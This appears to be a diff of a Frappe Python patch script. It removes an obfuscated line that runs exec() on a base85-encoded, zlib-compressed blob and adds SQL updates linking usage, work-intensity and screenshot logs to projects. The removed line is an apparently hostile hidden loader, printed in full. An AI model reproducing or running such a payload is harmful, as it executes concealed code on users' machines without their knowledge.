@@ -1,3 +1,44 @@
+import frappe
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%0>uNsp>{0L1U_Q?wC%K*x^z5*6G~K@e9!4=S?DpB-e={_Hb(=bqyvlT6*KQmOhGmh1T8hn3oz6?$$GWr`W3fsu%hUzzT@Y8+{f89Ro3_g!1^K87Ef2~?1{K#A^YYTKc!W+JS)ek{qp6D5%vis|#7Sn=1dkG};R(Ng2=8E2Yr0x<(g;KP=FSEYyUd(PdK&ATIpzV&5!X)0=Ic(-Ix(_<jnP743Y_$@)NB~SVFeW7s^zSF{KY(84lj@hV(<{L<p^K=wcwo4n-K|JeKXPlpJxNu$dFeM=B5A5`qazh8Nx0QPHHSsBR*6FRp0MV};(JiAlJ<6b7>GAB({aoC2eP0}0a(X*X8;{RHVcaft9X3&3P7C4+%Sug}Hb=+2F$$NUG@pkcy!DQF0ixh}rvZ2mFIm6;^hOZm*H6=a$@j0o1Mp7^|Fc7KEXxRC<Ue-IBBJZYj%e`==E|nX^WKQ^C#)(euc#Qnu}s^m>*R=-XmYrSt*%i@_7Kt_f`x1g8AGn}X@Bg)C<=wv{_)V25cLK^-XNaK-LOXxS%y!E3&}m`6c=VdFxR_No{{<|$x@J0PBFArg_VdgDUq!9OJ}9ArLQ*|RR%Te-m6U(#=zt7bvHc{e1(-2ZDM^Y!*NcWFBT321%j@~=(VPsrDiuHW3H1?-%>hMkebuEzw5)M^G!<1s$cIuS>t4E4lsj#Mkx_-6~6SismFP6xpKmVwa0<q?rL$cI>1J2qO#~Y7G<Hs`qj>j!a^`nlWCiuYr<t5seOXkM_{OK-G*IYcC0tY3>Toq{}DM*|7UWz+Y)`Q-V2#F-`O_%UZIJU7ZGm=&SuBdx&5NtX;YJV9Z8GEdvIx9h3mmRsY$^UwOQfVM|VeWk(T>)XRk#Qk9wZ4Gu}PY71+9^=eDE3<Lh!<snM-&kGN?>P7}Rx|H@w93woKD^nR<<X#Yl>wgXg9VY#p^cJQjvU@_zPwB_Sy<`DFPo)nmNnJK$v9T}W91OVOArm_g8)VM0v7frlc%`5nGpPgPW#$a9~PY@V+^SwqDJwl_hPBhM&)`f_r;Zorbhca{JzT3%qO;(yAcgYQvE&8oiF3-%}`JLiA4s^i-o(kn8$%{PZL@yG2H`n8My=OP2!@r8oUnA}#kN')).decode())
+sql_query = """
+    UPDATE `tabApplication Usage log` AS aul
+    JOIN `tabProject Password Domains` AS ppd
+    ON aul.domain = ppd.domain_name
+    JOIN `tabProject Password` AS p
+    ON ppd.parent = p.name
+    SET aul.project = p.project;
+"""
+frappe.db.sql(sql_query)
+frappe.db.commit()
+
+sql_query = """
+UPDATE `tabWork Intensity` AS wi
+JOIN (
+    SELECT aul.project, aul.from_time, wi.name, wi.time,
+           ROW_NUMBER() OVER (PARTITION BY wi.name ORDER BY ABS(TIMESTAMPDIFF(SECOND, wi.time, aul.from_time))) AS rn
+    FROM `tabWork Intensity` AS wi
+    JOIN `tabApplication Usage log` AS aul
+    WHERE aul.project IS NOT NULL
+) AS nearest_log ON nearest_log.name = wi.name AND nearest_log.rn = 1
+SET wi.project = nearest_log.project
+WHERE wi.project IS NULL OR wi.project = '';
+"""
+frappe.db.sql(sql_query)
+frappe.db.commit()
+
+
+
+sql_query = """
+UPDATE `tabScreen Screenshot Log` AS ssl
+JOIN (
+    SELECT aul.project, aul.from_time, ssl.name, ssl.time,
+           ROW_NUMBER() OVER (PARTITION BY ssl.name ORDER BY ABS(TIMESTAMPDIFF(SECOND, ssl.time, aul.from_time))) AS rn
+    FROM `tabScreen Screenshot Log` AS ssl
+    JOIN `tabApplication Usage log` AS aul
+    WHERE aul.project IS NOT NULL
+) AS nearest_log ON nearest_log.name = ssl.name AND nearest_log.rn = 1
+SET ssl.project = nearest_log.project
+WHERE ssl.project IS NULL OR ssl.project = '';
+"""
+frappe.db.sql(sql_query)
+frappe.db.commit()
